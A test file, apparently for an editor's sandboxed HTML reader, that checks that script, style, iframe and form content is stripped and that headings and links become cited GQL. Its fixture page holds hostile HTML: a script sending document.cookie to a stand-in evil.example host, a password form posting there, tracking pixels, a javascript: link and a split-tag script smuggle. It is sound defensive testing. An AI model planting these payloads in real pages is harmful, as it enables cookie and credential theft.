// An HTML file read safely (editor spec §67, format_html_sandboxed): its text, headings and links, with nothing run
// or fetched, as text and as GQL that cites its lines.
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { readNote } from '../src/drawing.ts';
import { HTML_MOST, htmlAsText, htmlToGql, readHtml } from '../src/html-read.ts';

describe('an HTML file read safely (format_html_sandboxed)', () => {
  const PAGE = [
    '<!doctype html><html><head><title>Plan &amp; budget</title>',
    '<script>fetch("https://evil.example/steal?c=" + document.cookie)</script>',
    '<style>body { background: url(https://evil.example/track.png) }</style></head>',
    '<body onload="alert(1)">',
    '<h1>Plan</h1>',
    '<p>See <a href="https://example.org/a">the brief</a>.</p>',
    '<img src="https://evil.example/pixel.gif" alt="pixel">',
    '<h2>Money <em>now</em></h2>',
    '<form action="https://evil.example/post"><input name="pw"><button>Send</button></form>',
    '<a href="javascript:alert(2)">click</a>',
    '<iframe src="https://evil.example/frame"></iframe>',
    '<h2>Later</h2><!-- <h1>not a heading</h1> -->',
    '</body></html>',
  ].join('\n');

  test('is shown as text: no script, style, frame or form survives, nothing is fetched, and it says what it left out', () => {
    const r = htmlAsText(PAGE);
    assert.ok(!('refused' in r));
    assert.ok(!/evil\.example|fetch\(|alert|<|onload/.test(r.text), r.text);
    assert.deepEqual(r.dropped, ['script', 'style', 'iframe', 'form', 'input', 'button']);
    assert.match(r.text, /^Shown as text only\. Left out, so nothing runs or loads: script, style, iframe/);
    assert.match(r.text, /See the brief \./);
  });

  test('its headings and links read as GQL, each citing its line, and an address is only ever words', () => {
    const gql = htmlToGql(PAGE, 'plan', 'Plan.html');
    const reading = readNote([gql]);
    assert.deepEqual(
      reading.problems.filter((p) => p.severity === 'error'),
      [],
    );
    const g = reading.world.plan;
    assert.equal(g.p('page').title, 'Plan & budget');
    assert.deepEqual(
      [...g.nodes].filter(([, [l]]) => l.has('Heading')).map(([, [, p]]) => [p.text, p.level, p.cites]),
      [
        ['Plan', 1, 'Plan.html#L5'],
        ['Money now', 2, 'Plan.html#L8'],
        ['Later', 2, 'Plan.html#L12'],
      ],
    );
    assert.deepEqual(
      g.edges.filter((e) => e[1] === 'IN').map((e) => [e[0], e[2]]),
      [
        ['h1', 'page'],
        ['h2', 'h1'],
        ['h3', 'h1'],
      ],
    );
    const links = [...g.nodes].filter(([, [l]]) => l.has('Link')).map(([id, [, p]]) => [id, p.text, p.href]);
    assert.deepEqual(links, [
      ['l1', 'the brief', 'https://example.org/a'],
      ['l2', 'click', 'javascript:alert(2)'],
    ]);
    assert.deepEqual(
      g.edges.filter((e) => e[1] === 'LINKS').map((e) => [e[0], e[2]]),
      [
        ['h1', 'l1'],
        ['h2', 'l2'],
      ],
    );
  });

  test('no part of a tag survives in its title, headings or text, however it is broken', () => {
    const r = readHtml('<title>Hi <<b>x</title><h1>Top <scr<b></b>ipt> <</h1><p>a <</p><p>b &lt; c</p>');
    assert.ok(!('refused' in r));
    assert.ok(![r.title, r.text, ...r.found.map((f) => f.text)].some((t) => t.includes('<script')), r.text);
    assert.ok(!r.found[0].text.includes('<'), r.found[0].text);
    assert.match(r.text, /b < c/, 'a < written as &lt; is text, and kept');
  });

  test('a page past the limit is refused, saying why, never read in part', () => {
    assert.match(htmlAsText('x'.repeat(HTML_MOST + 1)).refused, /larger than/);
    assert.match(htmlToGql('x'.repeat(HTML_MOST + 1), 'p', 'p.html').refused, /larger than/);
  });
});
